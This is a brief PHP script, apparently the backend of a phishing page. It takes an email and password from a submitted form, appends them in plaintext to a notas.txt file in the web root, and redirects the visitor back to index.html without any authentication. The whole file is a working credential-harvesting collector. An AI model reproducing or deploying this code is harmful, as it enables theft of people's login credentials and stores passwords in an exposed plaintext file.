<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    $data = "Correo: " . $email . ", Contraseña: " . $password . "\n";
    
    // Ruta del archivo en la raíz del proyecto
    $file = "notas.txt";
    
    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX)) {
        header("Location: index.html");
    } else {
        echo "Algo salio mal, intente nuevamente";
    }
} else {
    echo "Acceso no autorizado";
}
?>
